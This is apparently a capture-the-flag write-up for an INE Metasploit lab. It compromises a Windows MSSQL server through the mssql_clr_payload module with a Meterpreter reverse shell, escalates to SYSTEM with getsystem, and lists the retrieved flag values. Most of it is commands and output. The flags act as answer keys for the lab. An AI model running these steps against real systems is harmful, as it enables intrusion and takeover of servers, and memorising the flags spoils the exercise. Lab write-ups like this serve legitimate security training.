# Host & Network Penetration Testing: The Metasploit Framework CTF 1

## Target
* `http://target.ine.local`

## Tools used:
* `msf`

---

### Flag 1: Gain access to the MSSQLSERVER account on the target machine to retrieve the first flag.
We start weith an `nmap` scan of the system
```bash
┌──(root㉿INE)-[~]
└─# nmap -Pn target.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-25 09:32 IST
Nmap scan report for target.ine.local (10.3.22.43)
Host is up (0.0029s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.31 seconds
```
```bash
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
msf6 > db_nmap -Pn -sV target.ine.local
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-25 09:35 IST
[*] Nmap: Nmap scan report for target.ine.local (10.3.22.43)
[*] Nmap: Host is up (0.0028s latency).
[*] Nmap: Not shown: 991 closed tcp ports (reset)
[*] Nmap: PORT      STATE SERVICE            VERSION
[*] Nmap: 135/tcp   open  msrpc              Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
[*] Nmap: 1433/tcp  open  ms-sql-s           Microsoft SQL Server 2012 11.00.6020; SP3
[*] Nmap: 3389/tcp  open  ssl/ms-wbt-server?
[*] Nmap: 49152/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49155/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 66.44 seconds
```
***MYSQLSERVER*** is mentioned so we focus on that. We load up the relevant module on `msf` and set it properly 
```bash
msf6 exploit(windows/mssql/mssql_clr_payload) > run

[*] Started reverse TCP handler on 10.10.48.2:4444 
[!] 10.3.22.43:1433 - Setting EXITFUNC to 'thread' so we don't kill SQL Server
[-] 10.3.22.43:1433 - Exploit aborted due to failure: bad-config: Target SQL server arch is x64, payload architecture is x86
[*] Exploit completed, but no session was created.
msf6 exploit(windows/mssql/mssql_clr_payload) >   
```
Now we just use it to set up a session
```bash
msf6 exploit(windows/mssql/mssql_clr_payload) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/mssql/mssql_clr_payload) > run

[*] Started reverse TCP handler on 10.10.48.2:4444 
[!] 10.3.22.43:1433 - Setting EXITFUNC to 'thread' so we don't kill SQL Server
[*] 10.3.22.43:1433 - Database does not have TRUSTWORTHY setting on, enabling ...
[*] 10.3.22.43:1433 - Database does not have CLR support enabled, enabling ...
[*] 10.3.22.43:1433 - Using version v3.5 of the Payload Assembly
[*] 10.3.22.43:1433 - Adding custom payload assembly ...
[*] 10.3.22.43:1433 - Exposing payload execution stored procedure ...
[*] 10.3.22.43:1433 - Executing the payload ...
[*] 10.3.22.43:1433 - Removing stored procedure ...
[*] 10.3.22.43:1433 - Removing assembly ...
[*] Sending stage (201798 bytes) to 10.3.22.43
[*] 10.3.22.43:1433 - Restoring CLR setting ...
[*] 10.3.22.43:1433 - Restoring Trustworthy setting ...
[*] Meterpreter session 3 opened (10.10.48.2:4444 -> 10.3.22.43:49464) at 2026-01-25 10:10:09 +0530

meterpreter > 
```
Once we have a session, we just look for the next flag
```bash
C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5CD6-020B

 Directory of C:\

01/25/2026  04:01 AM                34 flag1.txt
08/22/2013  03:52 PM    <DIR>          PerfLogs
01/09/2025  07:00 AM    <DIR>          Program Files
12/15/2024  09:27 AM    <DIR>          Program Files (x86)
01/09/2025  07:12 AM    <DIR>          Users
01/09/2025  07:08 AM    <DIR>          Windows
               1 File(s)             34 bytes
               5 Dir(s)   3,805,601,792 bytes free

C:\>type flag1.txt
type flag1.txt
e6d3f90f251e43dbbfd55634e8c598d1
```
Flag: **e6d3f90f251e43dbbfd55634e8c598d1**

### Flag 2: Locate the second flag within the Windows configuration folder.
We notice that we need to escalate the privileges to get access to the config folder
```bash
C:\Windows\system32>cd config
cd config
Access is denied.

C:\Windows\system32>exit
exit
meterpreter > getuid
Server username: NT Service\MSSQLSERVER
```
We look for any tokens we can use to escalate our privileges
```bash
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege

meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
NT Service\MSSQLSERVER

Impersonation Tokens Available
========================================
No tokens available

meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
```bash
C:\Windows\System32\config>type flag2.txt
type flag2.txt
2b2df7eebd88498dad0e15bc86831815
```
We use that to get the next flag.  
Flag2: **2b2df7eebd88498dad0e15bc86831815**

### Flag 3: The third flag is also hidden within the system directory. Find it to uncover a hint for accessing the final flag.
We look for any text file inside the directory
```bash
C:\Windows\system32>dir C:\Windows\system32\*.txt /s /b
dir C:\Windows\system32\*.txt /s /b
C:\Windows\system32\catroot2\dberr.txt
C:\Windows\system32\config\flag2.txt
C:\Windows\system32\config\systemprofile\AppData\Local\Amazon\Ec2Config\Logs\FrameworkLaunchException.txt
C:\Windows\system32\drivers\gmreadme.txt
C:\Windows\system32\drivers\etc\EscaltePrivilageToGetThisFlag.txt
C:\Windows\system32\en-US\erofflps.txt
C:\Windows\system32\WindowsPowerShell\v1.0\en-US\default.help.txt
C:\Windows\system32\WindowsPowerShell\v1.0\Modules\BitsTransfer\en-US\about_BITS_Cmdlets.help.txt
C:\Windows\System32\drivers\etc>type EscaltePrivilageToGetThisFlag.txt
type EscaltePrivilageToGetThisFlag.txt
f05071c489964405b6dbbd11db509b65
```
With this we find the next flag.  
Flag: **f05071c489964405b6dbbd11db509b65**
### Flag 4: Investigate the Administrator directory to find the fourth flag.
We already have the root accedss so we just directly search the directory to get the final flag
```bash
C:\Users\Administrator>dir C:\Users\Administrator\*flag*.txt /s 2>nul    
dir C:\Users\Administrator\*flag*.txt /s 2>nul
 Volume in drive C has no label.
 Volume Serial Number is 5CD6-020B

 Directory of C:\Users\Administrator\Desktop

01/25/2026  04:01 AM                34 flag4.txt
               1 File(s)             34 bytes

     Total Files Listed:
               1 File(s)             34 bytes
               0 Dir(s)   3,805,564,928 bytes free

C:\Users\Administrator>type C:\Users\Administrator\Desktop\flag4.txt
type C:\Users\Administrator\Desktop\flag4.txt
04caf7f947f146418f9cdf1371bcfe59
```
Flag4: **04caf7f947f146418f9cdf1371bcfe59**